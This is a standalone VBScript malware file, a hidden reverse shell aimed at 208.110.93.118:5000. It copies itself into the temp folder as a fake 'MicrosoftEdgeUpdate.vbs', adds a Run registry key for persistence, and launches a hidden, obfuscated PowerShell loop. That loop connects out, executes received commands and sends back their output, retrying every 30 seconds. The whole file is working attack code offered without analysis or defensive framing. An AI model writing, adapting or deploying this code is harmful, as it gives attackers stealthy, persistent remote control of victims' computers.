' Reverse shell VBS (hidden)
' Target: 208.110.93.118:5000
' Persistence: ENABLED
' Retry on failure: ENABLED (30s loop)

' ---------- PERSISTENCE: copy to %TEMP% and add HKCU Run ----------
Dim fso, tempPath, targetPath, regPath, shellReg
Set fso = CreateObject("Scripting.FileSystemObject")
tempPath = fso.GetSpecialFolder(2)  ' 2 = TemporaryFolder
targetPath = tempPath & "\MicrosoftEdgeUpdate.vbs"
' Check if already installed (avoid duplicates)
If Not fso.FileExists(targetPath) Then
    fso.CopyFile WScript.ScriptFullName, targetPath, True
    Set shellReg = CreateObject("WScript.Shell")
    regPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MyService"
    shellReg.RegWrite regPath, targetPath, "REG_SZ"
End If
Set fso = Nothing
Set shellReg = Nothing
' ---------- END PERSISTENCE ----------

Dim shell, command
command = "powershell.exe -Command ""& { while($true){ try{ $woEi=(('System.NockTCPlinqlwhrcrezozlqiayiwiy')[0,1,2,3,4,5,6,7,4,3,6,0,8,9,10,4,3,2,6,11,12,13,12,14,15,4,16,3] -join ''); $VmjI=(('GetSrammiwxhqsuaumwsgbwwzek')[0,1,2,3,2,4,1,5,6] -join ''); $qzuU=(('System.TxACIEncodigvarxdixpdmqyxulviwcz')[0,1,2,3,4,5,6,7,4,8,3,6,9,0,10,11,11,12,13,14,15,16,17,13,18] -join ''); $IuJe=(('noisserpxE-ekovnI'[-1..-17] -join '')); $fBGy=(-join [char[]](79,117,116,45,83,116,114,105,110,103)); $ViGA=(('Get-Locainvolnvflhrbumkdiikwvg')[0,1,2,3,4,5,6,7,2,8,5,9] -join ''); $Mbph=(('esolC'[-1..-5] -join '')); $Lanh=New-Object -TypeName $woEi -ArgumentList '208.110.93.118',5000; $PJb=$Lanh.$VmjI(); [byte[]]$ASf=0..65535|%{0}; while(($mshB=$PJb.Read($ASf,0,$ASf.Length))-ne0){; $eYU=(New-Object -TypeName $qzuU).GetString($ASf,0,$mshB); $TPw=(& $IuJe $eYU 2>&1 | & $fBGy); $xPk=$TPw+'PS '+(& $ViGA).Path+'> '; $ExI=([text.encoding]::ASCII).GetBytes($xPk); $PJb.Write($ExI,0,$ExI.Length); $PJb.Flush(); }; $Lanh.$Mbph() } catch{ Start-Sleep -Seconds 30 } } }"""
Set shell = CreateObject("WScript.Shell")
shell.Run command, 0, False
Set shell = Nothing
